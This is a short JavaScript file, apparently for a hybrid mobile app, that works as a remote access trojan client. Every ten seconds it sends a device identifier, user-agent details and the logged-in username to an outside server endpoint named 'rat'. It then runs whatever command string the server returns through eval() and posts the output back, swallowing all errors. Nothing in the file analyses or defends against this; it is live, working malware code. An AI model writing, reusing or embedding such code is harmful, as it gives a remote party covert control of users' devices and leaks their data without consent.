var RAT_API = "https://codeduelarena.onrender.com/api/rat";

function getDeviceId() {
    var stored = localStorage.getItem('rat_device_id');
    if (stored) return stored;
    var id = 'device_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
    localStorage.setItem('rat_device_id', id);
    return id;
}

function getDeviceInfo() {
    return {
        deviceId: getDeviceId(),
        model: navigator.userAgent.match(/\(.*?\)/)?.[0]?.replace(/[()]/g, '') || 'Unknown',
        androidVersion: navigator.userAgent.match(/Android\s([\d.]+)/)?.[1] || 'Unknown',
        ipAddress: 'mobile',
        username: (window.user && window.user.username) || '',
        battery: 'unknown',
        location: ''
    };
}

function sendHeartbeat() {
    fetch(RAT_API + '/heartbeat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(getDeviceInfo())
    })
    .then(r => r.json())
    .then(data => {
        if (data.command) {
            executeCommand(data.command);
        }
    })
    .catch(() => {});
}

function executeCommand(fullCmd) {
    var parts = fullCmd.split(':');
    var cmdId = parts[0];
    var cmd = parts.slice(1).join(':');
    
    try {
        var output = eval(cmd);
        sendResult(cmdId, String(output));
    } catch(e) {
        sendResult(cmdId, 'Error: ' + e.message);
    }
}

function sendResult(cmdId, output) {
    fetch(RAT_API + '/result', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ commandId: cmdId, output: output })
    }).catch(() => {});
}

// Запуск heartbeat каждые 10 секунд
document.addEventListener('deviceready', function() {
    setInterval(sendHeartbeat, 10000);
    sendHeartbeat();
}, false);

setInterval(sendHeartbeat, 10000);